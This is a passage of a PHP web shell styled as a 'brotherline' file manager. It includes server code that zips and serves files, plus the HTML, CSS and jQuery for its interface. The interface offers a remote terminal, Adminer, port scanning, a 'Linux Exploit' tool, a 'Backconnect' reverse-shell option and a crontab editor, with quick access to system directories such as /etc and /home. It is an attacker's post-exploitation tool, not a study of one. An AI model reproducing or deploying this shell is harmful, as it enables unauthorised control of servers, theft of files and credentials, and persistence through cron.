                    new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $name => $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = basename($item_name) . '/' . substr($filePath, strlen($item_path) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            }
        }
    }
    $zip->close();

    if (file_exists($zip_path)) {
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zip_name . '"');
        header('Content-Length: ' . filesize($zip_path));
        readfile($zip_path);
        @unlink($zip_path);
        exit;
    } else {
        send_error('Could not create the zip file.');
    }
}

function generate_breadcrumbs($current_path)
{
    $breadcrumbs = [];
    $real_path = realpath($current_path);
    if ($real_path === false) return [['name' => 'Invalid Path', 'path' => '']];

    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

    $base_path = DOC_ROOT;
    if (strpos($real_path, $base_path) !== 0) {
        $base_path = $is_windows ? '' : '/';
    }

    $relative_path = substr($real_path, strlen($base_path));
    $parts = explode(DIRECTORY_SEPARATOR, trim($relative_path, DIRECTORY_SEPARATOR));

    $path_builder = $base_path;
    $breadcrumbs[] = ['name' => '[ ROOT ]', 'path' => DOC_ROOT];

    foreach ($parts as $part) {
        if (empty($part)) continue;
        $path_builder .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $path_builder];
    }
    return $breadcrumbs;
}

function format_size($bytes)
{
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>brotherline — File Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@300;400;500;600&family=Geist:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'ex': {
                            'bg':        '#0a0c0f',
                            'surface':   '#111318',
                            'border':    '#1e2229',
                            'hover':     '#181c23',
                            'accent':    '#e85d38',
                            'accent2':   '#f07a5c',
                            'blue':      '#4a9eff',
                            'text':      '#d4dae6',
                            'muted':     '#606878',
                            'header':    '#0d1016',
                        }
                    },
                    fontFamily: {
                        'sans': ['Geist', 'system-ui', 'sans-serif'],
                        'mono': ['Geist Mono', 'monospace'],
                    }
                }
            }
        }
    </script>

    <style>
        * { box-sizing: border-box; }

        body {
            background-color: #0a0c0f;
            color: #d4dae6;
            font-family: 'Geist', system-ui, sans-serif;
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: #0a0c0f; }
        ::-webkit-scrollbar-thumb { background: #1e2229; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #2a3040; }

        /* Titlebar chrome effect */
        .titlebar {
            background: linear-gradient(180deg, #161a22 0%, #111318 100%);
            border-bottom: 1px solid #1e2229;
        }

        /* Toolbar button */
        .toolbar-btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            color: #8a95a8;
            cursor: pointer;
            border: 1px solid transparent;
            transition: all 0.15s ease;
            background: transparent;
            white-space: nowrap;
        }
        .toolbar-btn:hover {
            background: #181c23;
            border-color: #1e2229;
            color: #d4dae6;
        }
        .toolbar-btn.primary {
            background: #e85d38;
            border-color: #e85d38;
            color: #fff;
        }
        .toolbar-btn.primary:hover {
            background: #f07a5c;
            border-color: #f07a5c;
        }
        .toolbar-btn i { font-size: 11px; }

        /* Address bar */
        .address-bar {
            background: #0d1016;
            border: 1px solid #1e2229;
            border-radius: 6px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            gap: 8px;
            height: 32px;
            flex: 1;
            min-width: 0;
        }
        .address-bar .path-text {
            font-family: 'Geist Mono', monospace;
            font-size: 12px;
            color: #8a95a8;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .address-bar .sep { color: #303847; font-size: 14px; }

        /* Sidebar */
        .sidebar {
            background: #0d1016;
            border-right: 1px solid #1e2229;
            width: 200px;
            flex-shrink: 0;
            overflow-y: auto;
        }

        .sidebar-section-title {
            font-size: 10px;
            font-weight: 600;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            color: #404858;
            padding: 12px 14px 6px;
        }

        .sidebar-item {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 5px 14px;
            font-size: 12px;
            color: #606878;
            cursor: pointer;
            border-radius: 0;
            transition: all 0.12s;
            border-left: 2px solid transparent;
        }
        .sidebar-item:hover { background: #111318; color: #d4dae6; border-left-color: #1e2229; }
        .sidebar-item.active { background: #131820; color: #4a9eff; border-left-color: #4a9eff; }
        .sidebar-item i { width: 14px; text-align: center; font-size: 11px; }

        /* File table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }

        .file-table thead th {
            background: #0d1016;
            padding: 8px 12px;
            text-align: left;
            font-size: 11px;
            font-weight: 500;
            color: #404858;
            letter-spacing: 0.04em;
            text-transform: uppercase;
            border-bottom: 1px solid #1e2229;
            position: sticky;
            top: 0;
            z-index: 5;
            white-space: nowrap;
            user-select: none;
        }
        .file-table thead th:hover { color: #606878; cursor: pointer; }

        .file-table tbody tr {
            border-bottom: 1px solid #0f1318;
            transition: background 0.1s;
        }
        .file-table tbody tr:hover { background: #111318; }
        .file-table tbody tr.selected { background: #111e2c !important; }
        .file-table tbody tr.ctx-active { background: #141a24 !important; }

        .file-table td {
            padding: 7px 12px;
            vertical-align: middle;
            white-space: nowrap;
        }

        .file-icon { font-size: 14px; width: 18px; text-align: center; }
        .file-icon.folder { color: #4a9eff; }
        .file-icon.file { color: #606878; }

        .file-name-link {
            color: #c8d0e0;
            text-decoration: none;
            font-weight: 400;
            transition: color 0.1s;
        }
        .file-name-link:hover { color: #e85d38; }
        .file-name-link.folder-type { color: #d4dae6; }
        .file-name-link.folder-type:hover { color: #4a9eff; }

        /* Row action buttons */
        .row-actions {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 2px;
            opacity: 0;
            transition: opacity 0.1s;
        }
        tr:hover .row-actions { opacity: 1; }

        .row-act-btn {
            background: none;
            border: 1px solid transparent;
            color: #404858;
            padding: 3px 6px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            transition: all 0.12s;
            line-height: 1;
        }
        .row-act-btn:hover { background: #1a1f27; border-color: #252d38; color: #d4dae6; }
        .row-act-btn.delete-btn:hover { background: #2a1414; border-color: #3d1a1a; color: #e85d38; }

        /* Dropdown */
        .action-menu {
            position: absolute;
            background: #131820;
            border: 1px solid #1e2229;
            border-radius: 7px;
            min-width: 180px;
            z-index: 3000;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            overflow: hidden;
            padding: 4px;
        }
        .action-menu-item {
            display: flex;
            align-items: center;
            gap: 9px;
            padding: 7px 11px;
            font-size: 12.5px;
            color: #8a95a8;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.1s;
            text-decoration: none;
        }
        .action-menu-item:hover { background: #1a2030; color: #d4dae6; }
        .action-menu-item.danger:hover { background: #2a1414; color: #e85d38; }
        .action-menu-item i { width: 14px; font-size: 11px; text-align: center; }
        .action-menu-divider { height: 1px; background: #1e2229; margin: 4px 0; }

        /* Status bar */
        .status-bar {
            background: #0d1016;
            border-top: 1px solid #1e2229;
            padding: 4px 14px;
            font-size: 11px;
            color: #404858;
            display: flex;
            align-items: center;
            gap: 16px;
            flex-shrink: 0;
        }
        .status-bar span { display: flex; align-items: center; gap: 5px; }

        /* Bulk actions bar */
        .bulk-bar {
            background: #0f1620;
            border: 1px solid #1a2535;
            border-radius: 6px;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 12px;
            color: #8a95a8;
        }

        /* Badge */
        .badge {
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 500;
        }

        /* Terminal panel */
        #terminal { width: 100%; height: 100%; }

        /* Tools panel */
        .tool-btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 10px;
            border: 1px solid #1e2229;
            background: #0d1016;
            color: #606878;
            border-radius: 5px;
            font-size: 11px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.15s;
            text-decoration: none;
        }
        .tool-btn:hover { border-color: #e85d38; color: #e85d38; background: #150e0c; }

        /* Stats badges */
        .stat-chip {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 3px 9px;
            border: 1px solid #1e2229;
            background: #0d1016;
            border-radius: 5px;
            font-size: 11px;
            font-family: 'Geist Mono', monospace;
            color: #606878;
        }

        /* Progress */
        .disk-track {
            height: 4px;
            background: #1e2229;
            border-radius: 2px;
            width: 80px;
            overflow: hidden;
        }
        .disk-fill {
            height: 100%;
            border-radius: 2px;
            background: #e85d38;
            transition: width 0.5s;
        }

        /* Modal */
        .modal-backdrop {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 4000;
            display: flex;
            align-items: center;
            justify-content: center;
            display: none;
        }
        .modal-backdrop.open { display: flex; }
        .modal-box {
            background: #111318;
            border: 1px solid #1e2229;
            border-radius: 10px;
            width: 420px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            overflow: hidden;
        }
        .modal-header {
            padding: 16px 20px;
            border-bottom: 1px solid #1a1f27;
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 14px;
            font-weight: 500;
            color: #d4dae6;
        }
        .modal-close {
            background: none;
            border: none;
            color: #404858;
            font-size: 16px;
            cursor: pointer;
            padding: 0 4px;
            transition: color 0.1s;
        }
        .modal-close:hover { color: #d4dae6; }
        .modal-body { padding: 20px; }
        .modal-footer {
            padding: 12px 20px;
            border-top: 1px solid #1a1f27;
            display: flex;
            justify-content: flex-end;
            gap: 8px;
        }

        .input-field {
            width: 100%;
            background: #0d1016;
            border: 1px solid #1e2229;
            border-radius: 6px;
            padding: 8px 12px;
            font-size: 13px;
            color: #d4dae6;
            font-family: 'Geist', sans-serif;
            outline: none;
            transition: border-color 0.15s;
        }
        .input-field:focus { border-color: #e85d38; }
        .input-label { font-size: 12px; color: #606878; margin-bottom: 6px; display: block; }

        /* SweetAlert2 overrides */
        .swal2-popup {
            background: #111318 !important;
            border: 1px solid #1e2229 !important;
            color: #d4dae6 !important;
            font-family: 'Geist', sans-serif !important;
            border-radius: 10px !important;
        }
        .swal2-title { color: #d4dae6 !important; font-size: 16px !important; font-weight: 500 !important; }
        .swal2-html-container { color: #8a95a8 !important; font-size: 13px !important; }
        .swal2-confirm { background: #e85d38 !important; color: #fff !important; border-radius: 6px !important; font-size: 13px !important; box-shadow: none !important; font-family: 'Geist', sans-serif !important; }
        .swal2-cancel { background: #1a1f27 !important; color: #8a95a8 !important; border-radius: 6px !important; font-size: 13px !important; box-shadow: none !important; font-family: 'Geist', sans-serif !important; }
        .swal2-input { background: #0d1016 !important; border: 1px solid #1e2229 !important; color: #d4dae6 !important; font-family: 'Geist Mono', monospace !important; font-size: 13px !important; border-radius: 6px !important; }
        .swal2-loader { border-color: #e85d38 transparent #e85d38 transparent !important; }

        /* Context menu */
        #contextMenu { display: none; position: fixed; z-index: 5000; }

        /* Breadcrumb */
        .breadcrumb-nav { display: flex; align-items: center; gap: 4px; overflow: hidden; }
        .bc-item {
            font-size: 12px;
            color: #606878;
            font-family: 'Geist Mono', monospace;
            cursor: pointer;
            padding: 2px 5px;
            border-radius: 3px;
            transition: all 0.1s;
            white-space: nowrap;
        }
        .bc-item:hover { background: #181c23; color: #d4dae6; }
        .bc-item.current { color: #d4dae6; cursor: default; }
        .bc-item.current:hover { background: none; }
        .bc-sep { color: #252d38; font-size: 12px; }



        /* Panel resizer */
        .panel-resizer {
            width: 1px;
            background: #1e2229;
            flex-shrink: 0;
            cursor: col-resize;
        }
        .panel-resizer:hover { background: #e85d38; }

        /* Xterm container */
        .terminal-wrap {
            flex: 1;
            min-height: 0;
            overflow: hidden;
            padding: 8px;
            background: #0a0c0f;
        }

        /* Permission badge */
        .perm-badge {
            font-family: 'Geist Mono', monospace;
            font-size: 11px;
            color: #404858;
            padding: 1px 5px;
            border-radius: 3px;
            background: #0d1016;
        }

        /* Checkbox */
        input[type="checkbox"] {
            accent-color: #e85d38;
            width: 13px;
            height: 13px;
            cursor: pointer;
        }

        .tool-output {
            background: #0a0c0f;
            border: 1px solid #1e2229;
            border-radius: 6px;
            padding: 12px;
            font-family: 'Geist Mono', monospace;
            font-size: 12px;
            max-height: 360px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        .tool-output dt { color: #e85d38; font-weight: 600; }
        .tool-output dd { color: #8a95a8; margin-left: 12px; margin-bottom: 8px; }

        /* Editor modal */
        #editorModal { display: none; }
        #editorModal.open { display: flex; }
        .editor-modal-box {
            background: #111318;
            border: 1px solid #1e2229;
            border-radius: 10px;
            width: 92vw;
            max-width: 1200px;
            height: 85vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 24px 80px rgba(0,0,0,0.7);
            overflow: hidden;
        }
        #editor { width: 100%; flex: 1; }

        /* Cron modal */
        #cronModal { display: none; }
        #cronModal.open { display: flex; }
        .cron-box { width: 680px; }
        textarea.input-field { resize: vertical; min-height: 200px; font-family: 'Geist Mono', monospace; font-size: 12px; line-height: 1.6; }

        /* Chmod modal */
        #chmodModal { display: none; }
        #chmodModal.open { display: flex; }

        #bulkChmodModal { display: none; }
        #bulkChmodModal.open { display: flex; }

        #formModal { display: none; }
        #formModal.open { display: flex; }

        /* Highlight selected row glow */
        tr.selected td:first-child { border-left: 2px solid #e85d38; }

        /* Window chrome dots */
        .wc-dot {
            width: 10px; height: 10px; border-radius: 50%;
            display: inline-block;
        }
    </style>
</head>
<body class="flex flex-col h-screen overflow-hidden">

    <input type="file" id="fileUploadInput" multiple style="display:none;" />

    <!-- ===== TITLEBAR ===== -->
    <div class="titlebar flex items-center px-4 h-10 gap-3 flex-shrink-0">
        <!-- Window chrome -->
        <div class="flex gap-1.5 items-center mr-2">
            <span class="wc-dot" style="background:#e85d38;"></span>
            <span class="wc-dot" style="background:#f0b429;"></span>
            <span class="wc-dot" style="background:#3db554;"></span>
        </div>

        <!-- Logo -->
        <div class="flex items-center gap-2 mr-4">
            <i class="fas fa-terminal text-ex-accent text-xs"></i>
            <span class="font-mono text-xs font-semibold text-ex-text tracking-wider">brotherline</span>
            <span class="text-ex-muted text-xs font-mono">/ file-manager</span>
        </div>

        <!-- Address bar -->
        <div class="address-bar flex-1 min-w-0">
            <i class="fas fa-folder-open text-ex-blue" style="font-size:11px;"></i>
            <div class="breadcrumb-nav flex-1 min-w-0" id="breadcrumbBar">
                <span class="bc-item current">Loading...</span>
            </div>
        </div>

        <!-- Stats chips -->
        <div class="flex items-center gap-2 ml-2">
            <div class="stat-chip" title="Disk Usage">
                <i class="fas fa-hdd" style="font-size:10px;color:#e85d38;"></i>
                <div class="disk-track"><div id="disk-fill" class="disk-fill" style="width:0%"></div></div>
                <span id="disk-label" class="text-ex-muted" style="font-size:10px;">...</span>
            </div>
            <div class="stat-chip"><i class="fas fa-user" style="font-size:10px;color:#4a9eff;"></i><span id="stat-user">...</span></div>
            <div class="stat-chip"><i class="fas fa-code" style="font-size:10px;color:#a0c4ff;"></i><span id="stat-php">...</span></div>
            <button id="refreshBtn" class="toolbar-btn" title="Refresh">
                <i class="fas fa-sync-alt"></i>
            </button>
            <a href="?fm_logout=1" class="toolbar-btn" title="Logout" onclick="return confirm('Logout?')" style="color:#e85d38;">
                <i class="fas fa-sign-out-alt"></i>
            </a>
        </div>
    </div>

    <!-- ===== TOOLBAR ===== -->
    <div class="flex items-center px-3 py-1.5 gap-1 flex-shrink-0 border-b" style="background:#0d1016;border-color:#1e2229;">
        <button id="goUpBtn" class="toolbar-btn" title="Go Up"><i class="fas fa-arrow-up"></i> Up</button>
        <button id="goToRootBtn" class="toolbar-btn" title="Root"><i class="fas fa-home"></i> Root</button>

        <div class="w-px h-5 mx-1" style="background:#1e2229;"></div>

        <button id="createDirBtn" class="toolbar-btn"><i class="fas fa-folder-plus"></i> New Folder</button>
        <button id="createFileBtn" class="toolbar-btn"><i class="fas fa-file-plus fa-fw"></i> New File</button>
        <button id="uploadBtn" class="toolbar-btn"><i class="fas fa-upload"></i> Upload</button>

        <div class="flex-1"></div>

        <!-- Bulk actions (hidden by default) -->
        <div id="bulkBar" class="bulk-bar hidden">
            <span id="selCount" class="font-mono text-ex-accent">0</span> selected
            <button id="bulkDelete" class="toolbar-btn" style="color:#e85d38;"><i class="fas fa-trash"></i> Delete</button>
            <button id="bulkDownload" class="toolbar-btn"><i class="fas fa-download"></i> Download</button>
            <button id="bulkChmod" class="toolbar-btn"><i class="fas fa-key"></i> Chmod</button>
        </div>

        <div class="w-px h-5 mx-1" style="background:#1e2229;"></div>

        <!-- Search -->
        <div class="flex items-center gap-2" style="background:#0a0c0f;border:1px solid #1e2229;border-radius:5px;padding:3px 9px;">
            <i class="fas fa-search" style="font-size:10px;color:#404858;"></i>
            <input id="searchInput" type="text" placeholder="Search files..." style="background:none;border:none;outline:none;font-size:12px;color:#d4dae6;width:140px;font-family:'Geist',sans-serif;">
        </div>
    </div>

    <!-- ===== MAIN AREA ===== -->
    <div class="flex flex-1 min-h-0 overflow-hidden">

        <!-- SIDEBAR -->
        <div class="sidebar flex flex-col">
            <div class="sidebar-section-title">Quick Access</div>
            <div class="sidebar-item active" id="sideRoot" onclick="changeDirectory('')">
                <i class="fas fa-hdd"></i> Root
            </div>
            <div class="sidebar-item" onclick="changeDirectory('/tmp')">
                <i class="fas fa-clock"></i> /tmp
            </div>
            <div class="sidebar-item" onclick="changeDirectory('/var/www')">
                <i class="fas fa-globe"></i> /var/www
            </div>
            <div class="sidebar-item" onclick="changeDirectory('/etc')">
                <i class="fas fa-cog"></i> /etc
            </div>
            <div class="sidebar-item" onclick="changeDirectory('/home')">
                <i class="fas fa-user-circle"></i> /home
            </div>

            <div class="sidebar-section-title mt-2">Tools</div>
            <a href="?action=adminer" target="_blank" class="sidebar-item">
                <i class="fas fa-database"></i> Adminer
            </a>
            <div class="sidebar-item" id="portScanBtn">
                <i class="fas fa-search-location"></i> Port Scan
            </div>
            <div class="sidebar-item" id="linuxExploitBtn">
                <i class="fab fa-linux"></i> Linux Exploit
            </div>
            <div class="sidebar-item" id="backconnectBtn">
                <i class="fas fa-network-wired"></i> Backconnect
            </div>
            <div class="sidebar-item" id="cronManagerBtn">
                <i class="fas fa-server"></i> Cron Manager
            </div>

            <div class="flex-1"></div>
            <div style="padding:10px 14px;font-size:10px;color:#252d38;font-family:'Geist Mono',monospace;border-top:1px solid #1a1f27;">
                © brotherline
            </div>
        </div>

        <!-- FILE PANE -->
        <div class="flex flex-col flex-1 min-w-0 min-h-0 overflow-hidden">
            <!-- File list -->
            <div class="flex-1 min-h-0 overflow-auto" id="filePane">
                <table class="file-table" id="fileTable">
                    <thead>
                        <tr>
                            <th style="width:32px;padding-left:16px;"><input type="checkbox" id="selectAll" /></th>
                            <th style="width:26px;"></th>
                            <th>Name</th>
                            <th style="width:110px;">Size</th>
                            <th style="width:155px;">Modified</th>
                            <th style="width:80px;">Perms</th>
                            <th style="width:50px;text-align:right;padding-right:14px;">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="fileBody">
                        <tr>
                            <td colspan="7" style="text-align:center;padding:40px;color:#404858;">
                                <i class="fas fa-spinner fa-spin" style="font-size:18px;"></i>
                                <div style="margin-top:8px;font-size:12px;">Loading...</div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Status bar -->
            <div class="status-bar">
                <span><i class="fas fa-list" style="color:#404858;"></i> <span id="statusCount">0 items</span></span>
                <span id="statusPath" style="font-family:'Geist Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"></span>
                <div class="flex-1"></div>
                <span id="statusServer" style="font-family:'Geist Mono',monospace;"></span>
            </div>
        </div>

        <!-- PANEL DIVIDER -->
        <div class="panel-resizer" id="panelDivider"></div>

        <!-- RIGHT PANEL: Terminal + Tools -->
        <div class="flex flex-col flex-shrink-0 overflow-hidden" style="width:360px;background:#0a0c0f;" id="rightPanel">
            <!-- Terminal -->
            <div class="flex flex-col flex-1 min-h-0 border-b" style="border-color:#1e2229;">
                <div class="flex items-center justify-between px-3 py-2 flex-shrink-0" style="background:#0d1016;border-bottom:1px solid #1e2229;">
                    <span style="font-size:11px;font-weight:600;color:#606878;letter-spacing:0.08em;text-transform:uppercase;">
                        <i class="fas fa-terminal mr-1" style="color:#e85d38;"></i> Terminal
                    </span>
                    <button id="clearTermBtn" class="toolbar-btn" style="padding:2px 6px;font-size:10px;">
                        <i class="fas fa-eraser"></i> Clear
                    </button>
                </div>
                <div class="terminal-wrap" id="terminalWrap">
                    <div id="terminal"></div>
                </div>
            </div>

            <!-- Tools -->
            <div class="flex-shrink-0 p-3" style="background:#0d1016;">
                <div style="font-size:10px;font-weight:600;color:#404858;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;">
                    <i class="fas fa-toolbox mr-1" style="color:#e85d38;"></i> Quick Tools
                </div>
                <div class="flex flex-wrap gap-2">
                    <a href="?action=adminer" target="_blank" class="tool-btn"><i class="fas fa-database"></i> Adminer</a>
                    <button class="tool-btn" id="portScanBtn2"><i class="fas fa-search-location"></i> Port Scan</button>
                    <button class="tool-btn" id="linuxExploitBtn2"><i class="fab fa-linux"></i> Linux Info</button>
                    <button class="tool-btn" id="backconnectBtn2"><i class="fas fa-network-wired"></i> Backconnect</button>
                    <button class="tool-btn" id="cronManagerBtn2"><i class="fas fa-server"></i> Cron</button>
                </div>
            </div>
        </div>

    </div>

    <!-- ===== CONTEXT MENU ===== -->
    <div id="contextMenu" class="action-menu">
        <a class="action-menu-item ctx-edit" href="#"><i class="fas fa-edit"></i> Edit</a>
        <a class="action-menu-item ctx-rename" href="#"><i class="fas fa-i-cursor"></i> Rename</a>
        <a class="action-menu-item ctx-chmod" href="#"><i class="fas fa-key"></i> Permissions</a>
        <a class="action-menu-item ctx-download" href="#"><i class="fas fa-download"></i> Download</a>
        <div class="action-menu-divider"></div>
        <a class="action-menu-item danger ctx-delete" href="#"><i class="fas fa-trash"></i> Delete</a>
    </div>

    <!-- ===== MODALS ===== -->

    <!-- Form Modal (Create / Rename) -->
    <div id="formModal" class="modal-backdrop">
        <div class="modal-box">
            <div class="modal-header">
                <span id="formModalTitle">Create File</span>
                <button class="modal-close" onclick="closeModal('formModal')"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <input type="hidden" id="actionType" />
                <input type="hidden" id="originalName" />
                <label class="input-label" id="itemNameLabel">File Name</label>
                <input type="text" class="input-field" id="itemName" placeholder="e.g., newfile.txt" />
            </div>
            <div class="modal-footer">
                <button class="toolbar-btn" onclick="closeModal('formModal')">Cancel</button>
                <button class="toolbar-btn primary" id="saveBtn">Save</button>
            </div>
        </div>
    </div>

    <!-- Chmod Modal -->
    <div id="chmodModal" class="modal-backdrop">
        <div class="modal-box">
            <div class="modal-header">
                <span>Change Permissions</span>
                <button class="modal-close" onclick="closeModal('chmodModal')"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <p style="font-size:12px;color:#606878;margin-bottom:12px;">
                    Changing permissions for: <strong id="chmodItemName" style="color:#d4dae6;font-family:'Geist Mono',monospace;"></strong>
                </p>
                <label class="input-label">Octal Value (e.g., 0755)</label>
                <input type="text" class="input-field" id="chmodValue" placeholder="0755" />
            </div>
            <div class="modal-footer">
                <button class="toolbar-btn" onclick="closeModal('chmodModal')">Cancel</button>
                <button class="toolbar-btn primary" id="saveChmodBtn">Apply</button>
            </div>
        </div>
    </div>

    <!-- Bulk Chmod Modal -->
    <div id="bulkChmodModal" class="modal-backdrop">
        <div class="modal-box">
            <div class="modal-header">
                <span>Bulk Permissions</span>
                <button class="modal-close" onclick="closeModal('bulkChmodModal')"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <p style="font-size:12px;color:#606878;margin-bottom:12px;">
                    Changing permissions for <strong id="bulkChmodCount" style="color:#e85d38;"></strong> selected items.
                </p>
                <label class="input-label">New Octal Value (e.g., 0755)</label>
                <input type="text" class="input-field" id="bulkChmodValue" placeholder="0755" />
            </div>
            <div class="modal-footer">
                <button class="toolbar-btn" onclick="closeModal('bulkChmodModal')">Cancel</button>
                <button class="toolbar-btn primary" id="saveBulkChmodBtn">Apply to All</button>
            </div>
        </div>
    </div>

    <!-- Editor Modal -->
    <div id="editorModal" class="modal-backdrop" style="z-index:4500;">
        <div class="editor-modal-box">
            <div class="modal-header">
                <span><i class="fas fa-code mr-2" style="color:#e85d38;"></i><span id="editorFileName">Edit File</span></span>
                <button class="modal-close" onclick="closeModal('editorModal')"><i class="fas fa-times"></i></button>
            </div>
            <div id="editor" style="flex:1;"></div>
            <div class="modal-footer">
                <button class="toolbar-btn" onclick="closeModal('editorModal')">Close</button>
                <button class="toolbar-btn primary" id="saveEditorBtn"><i class="fas fa-save mr-1"></i> Save</button>
            </div>
        </div>
    </div>

    <!-- Cron Manager Modal -->
    <div id="cronModal" class="modal-backdrop">
        <div class="modal-box cron-box">
            <div class="modal-header">
                <span><i class="fas fa-server mr-2" style="color:#e85d38;"></i>Cron Manager</span>
                <button class="modal-close" onclick="closeModal('cronModal')"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <label class="input-label">Current Crontab (edit and save)</label>
                <textarea class="input-field" id="cronJobsTextarea" rows="10" placeholder="# no crontab set"></textarea>
                <p style="font-size:11px;color:#404858;margin-top:6px;">Each line = one cron job. Clear all lines to remove crontab.</p>
            </div>
            <div class="modal-footer">
                <button class="toolbar-btn" onclick="closeModal('cronModal')">Close</button>
                <button class="toolbar-btn primary" id="saveCronBtn"><i class="fas fa-save mr-1"></i> Save Crontab</button>
            </div>
        </div>
    </div>

    <!-- SCRIPTS -->
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script>
    $(document).ready(function() {
        const API_URL = '';

        // ===================== HELPERS =====================
        function showSuccess(msg) {
            Swal.fire({ icon:'success', title:'Done', text:msg, timer:2000, showConfirmButton:false });
        }
        function showError(msg) {
            Swal.fire({ icon:'error', title:'Error', text:msg });
        }
        function showLoading(title, text='Please wait...') {
            Swal.fire({ title, text, allowOutsideClick:false, didOpen:()=>Swal.showLoading() });
        }

        function apiCall(action, data={}, method='POST') {
            const opts = { url: API_URL, type: method, dataType:'json', data:{ action, ...data } };
            if (method.toUpperCase()==='POST' && !(data instanceof FormData)) {
                opts.data = JSON.stringify(data);
                opts.contentType = 'application/json; charset=utf-8';
                opts.url = `?action=${action}`;
            }
            return $.ajax(opts);
        }

        function openModal(id) { document.getElementById(id).classList.add('open'); }
        function closeModal(id) { document.getElementById(id).classList.remove('open'); }
        window.closeModal = closeModal;

        // ===================== STATS =====================
        function updateStats() {
            $('#refreshBtn i').addClass('fa-spin');
            $.getJSON('?action=get_stats', function(d) {
                $('#stat-user').text(d.user);
                $('#stat-php').text('PHP ' + d.php_version);
                const p = d.disk.percent;
                $('#disk-fill').css('width', p + '%');
                $('#disk-label').text(d.disk.used + '/' + d.disk.total + 'GB');
                const color = p >= 90 ? '#e85d38' : p >= 70 ? '#f0b429' : '#3db554';
                $('#disk-fill').css('background', color);
                $('#statusServer').text(d.server_software);
            }).always(()=> setTimeout(()=>$('#refreshBtn i').removeClass('fa-spin'),500));
        }

        $('#refreshBtn').on('click', function(e) {
            e.preventDefault();
            loadFiles(); updateStats();
        });

        // ===================== FILE LISTING =====================
        let currentFiles = [];

        function loadFiles() {
            $.ajax({ url:API_URL, type:'GET', dataType:'json', data:{action:'list'},
                success: function(r) {
                    if (r.success) { currentFiles = r.files; renderFiles(r.files); updateBreadcrumb(r); }
                    else showError(r.message);
                },
                error: ()=>showError('Failed to load files.')
            }).always(()=>{ updateBulkBar(); $('#selectAll').prop('checked', false); });
        }

        function changeDirectory(path) {
            window.changeDirectory = changeDirectory; // make global
            $.ajax({ url:API_URL, type:'POST', dataType:'json', data:{action:'chdir', target_path:path},
                success: function(r) {
                    if (r.success) { currentFiles = r.files; renderFiles(r.files); updateBreadcrumb(r); }
                    else showError(r.message);
                },
                error: ()=>showError('Failed to change directory.')
            });
        }
        window.changeDirectory = changeDirectory;

        function getFileIcon(file) {
            if (file.type === 'folder') return '<i class="fas fa-folder file-icon folder"></i>';
            const ext = file.name.split('.').pop().toLowerCase();
            const iconMap = {
                php:'fa-file-code', js:'fa-file-code', ts:'fa-file-code', html:'fa-file-code', css:'fa-file-code',
